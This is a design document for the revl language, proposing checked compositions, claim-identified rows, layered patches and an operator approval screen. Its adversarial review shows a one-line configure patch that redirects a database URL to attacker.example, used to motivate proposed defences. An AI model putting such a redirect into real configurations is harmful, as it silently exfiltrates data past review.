# 426 - Composition rows, layered patches, admitted extension

*A composition-first design. Roadmap item 426, resolving the gap recorded in
424a.*

Status: design only. Nothing here is implemented. This document argues for a
particular shape and states what it costs; it does not schedule the work.

---

## 0. The premise

The component is revl's unit. A composition is currently the only thing in the
system that is made of components but is not itself a checked object: it is a
list of file paths, assembled by argv or by a bootstrap function, and it is
swapped whole. Every property the composition has (which key resolves to which
provider, which load order, which boundary surface) is *derived* by
`lower._link` and then thrown into a manifest dict that nothing in the language
can name.

This design makes the composition a **declared, checked, first-class artifact**
whose rows are addressable, whose patches are expressed against its own
structure, and whose admission is the gate revl already has. Distribution
(truc, the registry, bundles) is downstream: it moves a composition and its
layers around, and it does not define row identity or layering semantics. If
the registry vanished tomorrow, everything below still works from a directory
of files.

The headline claim: **revl does not need to invent row identity, because G2
already is one.** `lower._link` keys its provider table on `(key, realm)` and
enforces at most one provider per pair. A set of rows whose provision claims
are pairwise disjoint is a partition, and each block of a partition is a unique
name. DSH has to invent row ids and enforce their uniqueness by convention.
revl gets the same primary key for free, statically checked, from a rule that
has been load-bearing since the language shipped.

---

## 1. What already exists (the honest inventory)

Nothing below is proposed. This is the machinery the design builds on, with
locations, because half the design's argument is that very little is new.

**The link phase.** `src/revl/lower.py:9335`, `_link(program, components,
ambient_components, templates, errors)`. Its input is not files and not
modules: it is a list of already-lowered component dicts plus a list of
`ambient_components` read back from a running composition's manifest
(`lower.py:9372`). Files reach it only because `compiler.compile_files`
(`src/revl/compiler.py:410`) merges every root module into one `Program` first.
A file has no meaning at all past that merge.

**The composition's real primary key.** `provider_of: dict[tuple[str, str],
str]` at `lower.py:9426`, mapping `(provision key, realm)` to a component name.
G2 is enforced at `lower.py:9443`:

    provision conflict: key `db` is provided by both PgDatabase and SqliteDatabase (G2)

Realm defaults to `SHARED_REALM = ""` (`lower.py:422`) and is per key per
component, from `isolate <key> in realm(<name>)` (`lower.py:9419`). Two
providers of one key in *different* realms is the multi-tenancy feature, not a
conflict (`lower.py:9422`).

**No override exists, deliberately.** `parser.py:3505` refuses `swap` by name;
`lower.py:3818` states why: "two components may not provide the same key in one
document, so a replacement *provider* is not expressible". The one existing
approximation is name-keyed withdrawal: `compile_files(..., replacing=[...])`
drops ambient entries by name *before* `_link` runs (`compiler.py:532`), so G2
is never relaxed, only the input set is changed.

**The manifest.** `{"components": [{"name", "file", "inject", "provides"}],
"loadOrder": [...]}` (`lower.py:9588`, asserted at `tests/test_manifest.py:32`).
`loadOrder` is derived by Kahn, stable in entry order (`lower.py:9577`).
Provision keys are sorted per entry (`lower.py:9396`). Note what the manifest
entry does *not* carry: the service identity of a provision. `composition_diff
._components` says so out loud.

**Admission against a running composition.** `gate.admit_into(source,
manifest)` (`src/revl/gate.py:188`) is `compile_source(source,
manifest=dict(manifest))`: pure, checks only, G2/G3 span the union of ambient
and candidate. `Session.admit` (`src/revl/mcp/session.py:2142`) does the same
compile and then wires the result. `compiler.compile_files` with `manifest=`
compiles **only the new components** while returning a manifest describing the
**whole resulting composition**; `tests/test_manifest.py:44` asserts exactly
that.

**Incremental activation, additive only.** `Session._wire_turn`
(`session.py:2209`) emits only the turn document, plugs its components into the
live `driver.root`, and splices them into `self.ir`. Existing fibers are never
disposed. Replacement is refused with an explicit message
(`session.py:2189`): "item 330 is additive-only, hot-swap is `revl_swap`, a
separate, operator-gated verb".

**Whole-composition activation.** `Session.swap` (`session.py:794`) takes a
compiled IR, runs `driver._dispose_all`, re-emits the entire IR into a fresh
module, re-plugs everything, and bumps `_generation`. `Gate.propose`
(`gate.py:548`) is a standalone candidate compile followed by a health-gated
full `swap`.

**Authority drift.** `audit_diff.crossings` (`src/revl/audit_diff.py:204`)
produces five stable token kinds: `emit:`, `host:`, `taint:`, `declassify:`,
`secret:`. `diff_reach` (`:261`) catches an extern whose declared bound moved.
`evaluate` (`:528`) applies the acknowledgement model (`--accept <token>`,
`--accept-all`), and only additions fail. `composition_diff.diff`
(`src/revl/composition_diff.py:126`) adds the membership and wiring axes and
speaks in guarantees: "provider of key `db` changed from PgDatabase to
MysqlDatabase".

**A composition already declared in revl, badly.** revl-harness's
`src/manifest.rvl` exports `mf_files(mode: Str) -> List[Str]` (a flat file
list) and `mf_config(mode: Str) -> Str` (a JSON *string* of per-component
config). `docs/composition-bootstrap.md` documents the two-stage bootstrap this
forces: compile the manifest, emit it, exec it, call the function, then compile
the real composition from the strings it returned.

---

## 2. Question 1: what is a row, and what is its identity?

**A row is a placement of one component into one composition. Its identity is
the set of `(key, realm)` pairs it claims.**

Formally a row carries four things, of which only the first is identity:

| field | role |
|---|---|
| `claims: set[(key, realm)]` | **identity** |
| `component: Name` | provenance and disambiguation |
| `source: ModuleRef` | provenance |
| `config: record` | data |

Written form, canonical and deterministic:

| shape | id |
|---|---|
| one key, shared realm | `@db` |
| one key, named realm | `@kv#tenant_a` |
| several keys | `@cache+index` (keys sorted, realm suffix per key) |
| no keys (a pure consumer) | `#routes`, a declared label, required |

The sort is the one `_link` already applies at `lower.py:9396`, so the id a
human writes and the id the linker computes are the same string by
construction.

### Why the claim set and not something else

**Uniqueness is not a new rule.** G2 says a `(key, realm)` has at most one
provider in a composition. Therefore the claim sets of the rows in an
admissible composition are pairwise disjoint, therefore no two rows share an
id, therefore the id is a primary key. The invariant that makes row addressing
work is the invariant that was already there. Nothing has to be added to
`_link` for ids to be unique; if two rows collide, the composition was already
inadmissible.

**It survives a source edit.** Editing `PgDatabase`'s body does not touch
`{("db", "")}`. This is not a new property either: it is exactly what hot-swap
already relies on when a changed provider file links against the running
manifest (`tests/test_manifest.py:36`).

**It survives a rename.** Renaming `PgDatabase` to `PostgresDatabase` does not
change the claim set, so it is the same row. Today a rename needs the
`replacing=["PgDatabase"]` escape hatch precisely *because* identity is by
name (`compiler.py:388`, "A compiled component whose name matches a running one
implicitly replaces it"). Under claim identity the escape hatch is unnecessary
for renames, and `replacing` narrows to what it should always have been: an
explicit withdrawal, not an identity mechanism.

**A component name would not survive either.** It is per-source, it is chosen
by the author, and a third party who overrides `db` should not have to know or
care what upstream called its provider. Naming the component couples the patch
to an implementation detail; naming the key couples it to the contract.

### The claimless row, stated as a real seam

A row that provides nothing (revl-harness's `HarnessRoutes`, `Agent`,
`SelfImprove`, any top-level sink) has an empty claim set. Empty sets are not
distinguishable and G2 says nothing about them. So:

**A claimless row must carry an explicit label, and a composition that declares
a claimless row without one is refused.** The label is namespaced by the
declaring document (`#Harness::routes`) so two documents cannot mint the same
label, and `add` of an existing label is refused like any other id collision.

This is the honest cost of claim identity: roughly a third of a real
composition's rows are sinks and get a hand-written id with no checked relation
to the wiring. I would rather pay it than weaken the identity of the two thirds
that carry the wiring. A label is a name for a thing nothing else refers to; a
provision key is a name for a contract other rows depend on, and only the
second needs to be inferable.

### When a row's identity changes

Upstream ships a new version where `PgDatabase` also provides `pool`. The row
was `@db`; it is now `@db+pool`. Under this design that is **not the same
row**: adding a provision is a remove plus an add, and it must be written that
way and must appear in the wiring diff. This is correct and I will defend it.
A new `(key, realm)` claim is a new fact about what the composition serves; a
model in which upstream can silently grow the surface of a row a third party
has patched is a model in which the patch's meaning changes without the patch
changing. A layer written against `@db` fails closed against a base that no
longer has a row with that id, and the failure names both.

---

## 3. Question 2: does a patch address a file or a component?

**Neither. A patch addresses a row, and a row is addressed by its provision
claim.** `patch @db`, never `patch "pg_database.rvl"` and never `patch
PgDatabase`.

### Against files

A file has no linker meaning. `compile_files` merges every root module into one
`Program` before `_link` sees anything (`compiler.py:410`); the manifest entry
carries `file` as provenance only. A file is a bag of components that happened
to be edited together.

The consequence is not aesthetic. A file-addressed patch addresses an artifact
the checker does not model, so **the patch itself cannot be checked, only its
result can**. "Replace file X with file Y" has no verifiable meaning until Y is
compiled and linked; before that the system cannot say whether the patch is
even coherent. That is DSH's position, and it is why DSH's layering is
unverified: the layering system and the checking system speak about different
objects.

### Against component names

Closer, and wrong for the case that motivates the item. The third-party story
is "override one row without forking". If the override must name `PgDatabase`,
the patch is coupled to an implementation detail upstream may rename, and the
patch author had to read upstream's source to write it. If the override names
`db`, it is coupled to the contract upstream published, and the patch author
had to read upstream's *interface*. Patching against contracts rather than
implementations is the entire difference between an ecosystem and a fork.

### For provision claims

A claim-addressed patch is checkable **before** it is applied and **without
compiling any component body**. `provides k: S` lives in the component header,
and header-only lowering already exists (`_component_header_stub`,
`lower.py:4907`, kept deliberately so G2/G3 do not miss real conflicts when a
body fails to lower). So `revl layer check` can resolve every row id, detect
every id collision, and render the whole wiring diff from headers alone. Only
the final admission needs bodies. That is a genuine cost win that falls out of
addressing the right object.

---

## 4. Question 3: layer resolution

### The layers, in fixed order

1. **base** - the composition document's own rows.
2. **stack layers** - the layers the base names, in declaration order.
3. **site layer** - the operator's own local layer. Exactly one.
4. **invocation overlay** - CLI and environment bindings. Config values only;
   may not change row structure.

### The operations, four and no more

| operation | meaning |
|---|---|
| `add <row>` | introduce a row. Refused if its claim set intersects any existing row's claims. |
| `remove @id` | drop a row. |
| `replace @id with <row>` | swap the implementation behind a row. **The replacement must claim exactly the same set.** |
| `configure @id { field: value }` | merge fields into a row's config. |

There is deliberately **no positional operation** (no `insert before`, no
priority, no ordering). Load order is derived by Kahn over the dependency graph
(`lower.py:9577`), not declared. A position operation would be a lie, and more
importantly it would give two layers something to fight over that has no
correct resolution. This is a straight composition-first win: DSH must specify
stack order because in DSH stack order *is* resolution order; in revl
resolution order is computed from the wiring, so no layer ever gets to reorder
anything.

`replace` being claim-preserving is the second determinism lever. Because a
replacement claims exactly what it replaced, **a `replace` can never create or
destroy a G2 conflict**. Changing what a row claims is expressible, but only as
`remove` plus `add`, which is loud in the diff.

### Determinism: refuse, never resolve by precedence

Resolution is a fold over the four levels in order, but every peer-level
operation is defined to be either commutative or refused, so the result is
independent of the order in which stack layers are listed.

| situation | outcome |
|---|---|
| two layers `add` rows with intersecting claims | **REFUSED** |
| two layers `replace` the same `@id` | **REFUSED** |
| two layers `configure` the same `@id` and the same field, different values | **REFUSED** |
| two layers `configure` the same `@id`, disjoint fields | merged, commutative |
| two layers `remove` the same `@id` | idempotent, allowed |
| one layer `remove @id`, another `replace`/`configure` `@id` | **REFUSED** |

The invariant this buys, and the sentence the design should be judged on:

> **No provider is ever chosen by precedence.** Between peer layers, a claim
> collision is refused. Only the operator's own layer resolves it, and only by
> naming both sides.

The site layer and the invocation overlay are the only levels with override
authority. The site layer may write `resolve @id to <row> over acme::pg,
corp::sqlite`, naming both conflicting layers explicitly; a site-layer
operation always beats a stack-layer operation on the same row without
refusal. The reasoning is not ergonomic convenience: refusal is only meaningful
*between peers*. The operator is not a peer of the layers, the operator is the
person the refusal is shown to, so there has to be exactly one level at which
"I decide" is expressible, and it is the level a human owns.

### How this interacts with G2

Two rules, and the second is the load-bearing one.

**First, the layer resolver's refusals are earlier and stronger than G2, and
they exist for blame.** G2's message names two components: "key `db` is
provided by both PgDatabase and SqliteDatabase (G2)". After layering that
message is useless, because the operator wrote neither component. So a
layer-level collision must be reported with layer provenance:

    layer conflict: key `db` is claimed by
      layer acme::pg@2.1      row @db, component PgDatabase
      layer corp::sqlite@0.4  row @db, component SqliteDatabase
    Neither layer is preferred. Resolve it in your site layer:
      resolve @db to acme::pg
    (this is G2, provision disjointness, seen at the layer level)

**Second, the resolver is not on the trusted path.** `_link` still runs G2 and
G3 unchanged over the assembled composition. The layer resolver is a
pre-check whose only privilege is to produce a better message. A bug in the
resolver must not be able to admit a composition the linker would refuse, and
under this rule it cannot: the resolver can only be wrong in the direction of
refusing something admissible, which is a usability bug, not a soundness one.

### Realms fall out

Because a row id carries the realm, `@kv#tenant_a` and `@kv#tenant_b` are
different rows, and two layers adding them do not collide. This needs no new
rule.

The limitation, named rather than hidden: `isolate k in realm(...)` is declared
in the *component source*, not in the composition, so a layer cannot re-realm
somebody else's component. Two layers that both want to provide `kv` in the
shared realm are refused and must coordinate at the source level, or use the
sanctioned multi-provider shape, spawn plus realms plus a router
(`docs/distribution-model.md`). Moving `isolate` into the composition document
is a plausible follow-on and is out of scope here.

---

## 5. Question 4: must the whole composition be re-admitted?

The honest answer is in three parts, and it is a real advantage with a real
limit.

### (a) Checking generalizes completely, today, with no new engine

`gate.admit_into(source, manifest)` already **is** incremental patch admission
at the verdict level. A resolved patch is a delta: rows removed, rows added,
config changed. The check is:

1. Build the ambient manifest with the removed and replaced rows' components
   filtered out. This is exactly what `compiler.py:532` already does for
   `replacing`, by name, before `_link` runs.
2. Compile only the added and replacing rows' sources with `manifest=` that.
3. G2 and G3 span the union, because `_link` takes `ambient_components` and
   the new components together (`lower.py:9372`).

The evidence that this works is already in the suite:
`test_hot_swap_compiles_a_lone_file_against_the_running_manifest` asserts that
compiling one file against a running manifest yields
`admitted["components"] == ["PgDatabase"]` while
`admitted["manifest"]["components"] == {PgDatabase, UserCache}` and
`loadOrder == ["PgDatabase", "UserCache"]`. The verdict spans the whole
composition; the compile spans only the delta.

So: **the cost of answering "is this layer safe to apply" is one compile of the
patched rows, not of the composition.** That is the cost that matters for the
third-party story, because it is the cost of the operator's decision.

### (b) Activating it incrementally generalizes only for the additive case

`_wire_turn` (`session.py:2209`) is a genuine partial link: it emits only the
turn document, plugs into the live `driver.root`, and leaves every existing
fiber untouched. A pure `add` patch rides it unchanged. That is item 330 as it
stands, and a layer that only adds rows is a hot, generation-preserving
extension today.

A `replace` or `remove` patch cannot ride it, and the reason is G7, not effort.
The withdrawn component's fiber must be disposed, its accumulated teardown must
run in the correct LIFO position, and every consumer resolved to its key must
be re-resolved. What exists is `_dispose_all` plus a full reload
(`session.py:848`), and `_abort_swap` is a full reload too. So a
replace-patch costs a full generation change.

**I am not proposing to make replacement incremental at the fiber level.** Per
key re-resolution plus a partial dispose in dependency order is a separate
project and it puts G7 at risk. Item 426 should ship incremental *admission*
and inherit whole-generation *activation*, and say so.

### (c) The one case worth a follow-on

A `configure`-only patch (the most common third-party patch, and precisely
DSH's "override one row and restart") still costs a full generation change
today, because config is baked into `driver.config` at load. It is the highest
value narrowing available: a config-only patch changes no wiring, so no G2 or
G3 verdict can change, and the delta is a value substitution. Filing it as a
follow-on is the right call; treating it as part of 426 would drag fiber
lifecycle into a layering item.

### Summary of costs

| patch shape | admission cost | activation cost |
|---|---|---|
| `add` only | compile the added rows | incremental, no generation change (`_wire_turn`) |
| `configure` only | compile nothing (no source changed) | full generation change (follow-on: narrow this) |
| `replace` / `remove` | compile the replacing rows | full generation change |

---

## 6. Question 5: the approval UX

The operator is applying a third-party layer to a composition they are
responsible for. The screen has four blocks, a verdict, and an acknowledgement
line. Every value is derived; nothing is invented.

### Headline: AUTHORITY

Source: `audit_diff.evaluate(audit_report(base_ir), audit_report(resolved_ir))`,
plus `diff_reach`, `diff_capability_scopes`, `diff_backends`, `diff_recovery`,
`diff_cardinality`.

    AUTHORITY  applying acme::pg@2.1 to Harness (generation 7)

      + host:PgDatabase:pg_connect        new host reach
      + emit:PgDatabase:metrics.record    new emission
      + secret:db:PG_PASSWORD             new secret binding (name+capability only)
      - host:SqliteDatabase:sqlite_open   removed (narrowing, never blocks)
      ! reach-weakened:pg_connect         declared bound moved

    3 widening(s). Acknowledge with --accept <token> or --accept-all.

The additions-only failure rule is `audit_diff`'s, unchanged, and the token
strings are copy-paste acknowledgeable exactly as `docs/audit-diff.md` already
promises. The layer UX must not invent a second authority model.

### WIRING

Source: `composition_diff.diff(base_ir, resolved_ir)`, which already speaks in
guarantees.

    WIRING
      row @db      PgDatabase replaces SqliteDatabase   (layer acme::pg@2.1)
      row @metrics MetricsSink added                    (layer acme::pg@2.1)
      `Front` now requires `metrics`

This is the row view, and it is rendered **from the resolved IR, not from the
patch text**. A layer that claims one thing and does another shows it here.

### CONFIG

Source: the resolver, per row, per field, with the layer that set each value.
This block exists because the authority diff is structurally blind to it, and
saying so on the screen is part of the design:

    CONFIG
      @db  url   "postgres://primary:5432/app" -> "postgres://replica:5432/app"   acme::pg@2.1
      @db  pool  8 -> 16                                                          acme::pg@2.1
      note: config values are not authority tokens. A changed value can redirect
      an existing crossing without adding one. See the reach bounds below.

Section 9 turns this note into a checked rule rather than a warning.

### PROVENANCE

Source: the bundle. `revl bundle` and `revl verify` already exist
(`docs/bundle.md`), and `attestation.json` is item 127. A layer *is* a bundle.

    PROVENANCE
      acme::pg@2.1   attested by acme-release (key 4f21...)   verify: OK
      corp::obs@0.3  UNATTESTED

### The verdict, and the rule that matters

    VERDICT  admissible (gate 1.0.0, language 2.0.0)

**Approval is offered only on a candidate that already admits.** A refused
layer is not an approval question, it is a refusal, and it is shown with the
linker's own why-trace. This is the difference the item is about: DSH's layer
applies and then you find out; revl's layer passes the gate before the operator
is asked anything. The operator's decision is never "will this work", it is
only "do I consent to this authority".

---

## 7. Question 6: should the composition be declared in revl?

**Yes.**

### The case for

**1. The one real consumer already does it, and had to leave the language to do
it.** revl-harness's `src/manifest.rvl` declares the whole harness in revl, but
as `mf_files(mode) -> List[Str]` and `mf_config(mode) -> Str`, a file list and a
JSON string. Nothing checks that the component names in `mf_config`
(`CompositionKit`, `SessionIndex`, `WebShell`) correspond to any component in
`mf_files`'s list. Nothing checks the fields against each component's `config
{}` block. The harness roadmap records two measured instances of exactly this
bug class: a composition that listed 31 components while `SessionIndex` was
"already transitively used" but not among them, and a console panel that
"printed a nine-name string literal while the live boot served thirty-one
keys". Both are compile errors under a declared composition and neither is
today.

**2. Layering needs a structure to patch.** `List[Str]` has no rows. This is
the whole of 424a in one sentence.

**3. The bootstrap floor gets smaller, not bigger.**
`docs/composition-bootstrap.md` establishes the honest floor: something outside
revl must compile the first document. Today that document is compiled, *emitted
to Python, exec'd as a module, and called*, and it returns a JSON string that
the host parses. A declared composition is compiled and **read**: its rows are
already in the IR. No emission, no exec, no JSON round trip. Stage 1 shrinks
from "compile, emit, exec, call, parse" to "compile, read the manifest".

**4. Placement proves the point from the other end.** `placement.py` reads
`[processes]`, `[tiers]` and `[config.X]` from TOML: a data description of a
composition, outside the language, cross-referenced against the IR by the
conductor at `placement.py:725` with a G2/G3 style diagnostic. A declared
composition subsumes it, and `place @db on process "provider" backend rust`
becomes a checked statement about a row rather than a TOML key that might name
nothing.

### The case against, and the answer

**"A new document form must earn itself."** It does not add a checker. The
composition document is a *pre-linker* artifact: it resolves to the same
`components` list `_link` already takes, and every guarantee is still decided by
`_link`. What it adds is a name for the thing `_link` builds.

**"Config is genuinely dynamic: tokens, paths, model wiring."** True, and
`manifest.rvl`'s own header says the host still appends the environment tier.
Keep that: the invocation overlay is the last layer and it carries values only,
never structure. The declaration covers structure and static config, which is
exactly the part that currently has no checking at all.

**"Second-system risk."** Real. The mitigation is the four-operation limit, no
positional operations, and no conditional logic in the composition document
beyond named variants. If a composition needs computation to decide its shape,
that is what the existing `mf_files` bootstrap is for, and it should keep
working: a declared composition and a computed file list are not exclusive.

### The surface

```revl sketch
composition Harness {
  use "src/services.rvl"

  row @gate   from "src/components/admission_gate.rvl"
  row @fsr    from "src/components/fs_relay.rvl"
  row @agent  from "src/components/agent.rvl"
    config { max_steps: 8, context_budget: 1200 }
  row #routes from "src/components/harness_routes.rvl" component HarnessRoutes

  open @agent { max_steps, context_budget }

  variant "voice" {
    add row @voice from "src/components/voice_plugin.rvl"
    configure @agent { max_steps: 40, context_budget: 8000 }
  }
}
```

```revl sketch
layer acme::pg for Harness {
  replace @db with row from "acme/pg_database.rvl" component PgDatabase
    config { url: "postgres://primary:5432/app", pool: 8 }
    reach { pg_connect: host("primary.internal:5432") }
  add row @metrics from "acme/metrics.rvl"
}
```

Surface points that carry weight:

- `row @db from "file"` is an **assertion** about what the file's component
  provides, checked against the header. If the component provides `{db, cache}`
  the row must be written `@cache+db`. The document cannot lie about the
  wiring, and the id a human writes is the linker's key.
- `component <Name>` is optional, needed only to disambiguate a file holding
  several components. It is provenance, never identity.
- `variant` is the base document's own mode selector (the harness's
  `voice`/`code`/`cli`). `layer X for Y` at top level is a third-party layer.
  They are different words because they have different authority: a variant is
  written by the composition's owner, a layer is not.
- `open @agent { ... }` declares the fields a third-party layer may
  `configure`. See section 9.
- `reach { ... }` is the composition-level authority bound. See section 9.

---

## 8. Non-goals

- **Not** incremental activation of `replace` or `remove`. G7, section 5(b).
- **Not** re-realming another author's component from a layer. Section 4.
- **Not** a replacement for spawn plus realms plus a router as the
  multi-provider shape (`docs/distribution-model.md`).
- **Not** a registry design. A layer is a bundle; how it travels is truc's
  question, and this design is indifferent to the answer.
- **Not** interception. That is 424b, and it is deliberately separate: a layer
  changes *what is composed*, never *what observes a call*.

---

## 9. Adversarial review

### The CRITICAL: I made the authority diff the headline, and it is blind to the most common patch

`audit_diff.crossings` (`audit_diff.py:204`) emits five token kinds:
`emit:<component>:<label>`, `host:<component>:<name>`, `taint:`, `declassify:`,
`secret:<capability>:<name>`. None is derived from config. `diff_reach`
(`:261`) compares each extern's **declared** bound, which is a property of the
extern declaration in source, not of a runtime value.

Therefore a layer consisting solely of:

    configure @db { url: "postgres://attacker.example/app" }

changes no crossing token, changes no declared reach, adds no secret, and
changes no wiring edge. `composition_diff.diff` reports nothing, because
membership and edges are identical. The operator's screen prints the
`docs/audit-diff.md` clean line:

    authority-drift: clean, the G8 boundary surface is unchanged

and the operator approves an exfiltration.

This is worse than the status quo it replaces. DSH never claimed its layer
review meant anything, so a DSH operator reads a config diff with appropriate
suspicion. My design puts a green "clean" above the one change that most
deserves scrutiny, and the green line is *technically correct*, which is the
worst possible failure mode for a safety surface. It is squarely my flaw: I
chose to make the authority diff the headline, and I chose `configure` as a
first-class operation, and I did not connect them.

Two runners-up, for the record, both handled in the body above and neither
critical: upstream growing a row's claim set invalidates a layer's row id
(fails closed, section 2); claimless-row labels are author-chosen and could
collide (namespaced by document, refused on collision, section 2).

### The fix, in three parts

**Part 1, the primary fix: the composition declares the reach bound, because
the composition is what the operator approves.**

`reach` is currently declared per extern, in the component's source, by the
component's author. That is the wrong owner for a layered world: the person
deciding what `pg_connect` may talk to is the operator assembling the
composition, not the third party who wrote the extern. So a row may carry a
composition-level reach bound:

```revl sketch
row @db from "acme/pg_database.rvl"
  config { url: "postgres://primary:5432/app" }
  reach { pg_connect: host("primary.internal:5432") }
```

The rule: **a config value that flows to a bounded extern is checked against
the composition's declared bound at resolution time.** A `configure` that moves
`url` to `attacker.example` is then not a silent redirect, it is a refusal:

    layer refused: acme::pg@2.1 configures @db.url to a value outside the
    reach declared for `pg_connect` in composition Harness
      declared:  host("primary.internal:5432")
      requested: host("attacker.example:5432")
    Widen the bound in your site layer, or refuse the layer.

This is the composition-first answer, and it is the reason the framing earns
its keep: the authority bound belongs on the object the human approves. It also
composes with `diff_reach` unchanged, because widening a composition-level
bound in the site layer moves a declared bound and is already flagged as
`reach-weakened`.

**Part 2, the token, so unbounded fields are still visible.** Not every extern
has a declared reach. Add a sixth crossing kind,
`config:<component>:<field>`, emitted for a config field whose value reaches an
emission argument or an extern argument. The classifier is the reach and taint
machinery that already exists (`_reach_map`, and G9 provenance at
`lower.py:5364`); a field that only feeds pure computation (`max_steps: 8`)
gets no token. Then a redirect renders as a first-class widening:

    ~ config:PgDatabase:url  "postgres://primary:5432/app" -> "postgres://attacker.example/app"
        reaches host:PgDatabase:pg_connect

**Part 3, the fail-safe, because reach analysis is incomplete by nature.** The
resolver never prints `clean` when the resolved composition's config surface
differs from the base's, whatever the reach analysis concluded. `clean` requires
*both* an unchanged token set and an unchanged config surface. A field the
analysis cannot classify is treated as authority-bearing. Incompleteness then
costs noise, never silence, which is the only acceptable direction for a
surface whose green line a human will trust.

**Part 4, the structural rule that makes parts 1 to 3 tractable.** An
unrestricted `configure` on a row a layer does not own is an authority with no
declared reach, which is exactly the shape 424b refuses for interception. So:

> A **stack layer** may `configure` only a row it also `add`s or `replace`s, or
> a field the base composition declared `open`. A **site layer** and the
> invocation overlay may configure anything.

This preserves the motivating use case exactly. "A user overrides one row and
restarts, nobody forks" is the *site* layer, and it stays unrestricted, which
is right: the operator is not attacking themselves. What becomes restricted is
a third party reaching into a row it does not own, which is the case that
motivated the whole review. And it puts the extension surface where
composition-first says it belongs: **declared, on the composition, by its
owner.**

### What the fix costs

`open` is a new obligation on composition authors: a base that declares nothing
`open` is not extensible by configuration, only by `replace`. I think that is
correct rather than merely acceptable. An extension point that nobody declared
is not an extension point, it is an accident, and "third parties can reach any
field of any row" is precisely how a configuration surface becomes an
unversioned API that can never be changed. Making the surface explicit is the
same move `service` makes for method surfaces and `provides` makes for wiring,
and it is the move DSH never made.

---

## 10. Exit tests

A future implementation is done when these hold. They are stated so the item
can be closed against evidence rather than against the text above.

1. **Row id uniqueness is G2.** A composition with two rows whose claim sets
   intersect is refused, and the refusal names both layers when the rows came
   from different layers. A composition whose rows have disjoint claims never
   needs a uniqueness check of its own.
2. **Rename transparency.** Renaming a component in a source file, with no
   other change, produces an empty wiring diff and no `replacing` argument.
3. **Peer conflicts refuse.** Two stack layers replacing the same row is a
   refusal, not a precedence outcome, and permuting the layer list changes
   nothing but message ordering.
4. **Site resolution works.** The same pair resolves when the site layer names
   both sides, and the resolved provider is the one named.
5. **Incremental admission.** Applying a `replace` layer compiles only the
   replacing rows' sources, and the verdict is identical to a full re-compile of
   the whole composition. Assert both the verdict and the compiled-component
   count, the way `tests/test_manifest.py:44` already does.
6. **Additive layers stay hot.** An `add`-only layer applies without a
   generation change, through `_wire_turn`.
7. **The critical is closed.** A layer whose only operation is `configure @db {
   url: ... }` on a bounded extern is refused; on an unbounded one it produces a
   `config:` widening token; and in neither case does the report print `clean`.
8. **Header-only checking.** `revl layer check` resolves every row id and
   renders the full wiring diff without lowering any component body.
9. **The resolver is untrusted.** A deliberately corrupted resolver output
   cannot produce an admitted composition that `_link` would refuse, because
   `_link` runs unchanged on the assembled result.

---

## 11. The strongest argument against this design

Stated plainly, because it should be weighed rather than discovered later.

**Claim-set identity is elegant and it may be too rigid for how software
actually versions.** The design's central move is that a row is named by what
it provides, which makes identity fall out of G2 for free. The price is that a
row's identity is a function of upstream's surface, and upstream changes its
surface routinely and for good reasons. A minor version that adds a provision
to an existing component silently renames every row that component backs, and
every third-party layer written against the old id fails closed and must be
edited. A name-keyed or explicitly-declared-id model would have absorbed that
change without a ripple.

I chose to fail closed, and I would choose it again, because the alternative is
a layer whose meaning changes without the layer changing. But "fails closed on
every upstream surface addition" is a real adoption tax, and a truc-first
design that anchors identity in a declared, distributed, versioned id would pay
less of it. If the ecosystem this is for looks more like npm (many small
packages, frequent minor versions, loose coupling) than like an operating
system (few, slow, tightly reviewed components), that tax is the thing that
decides the item, and this design loses on it.
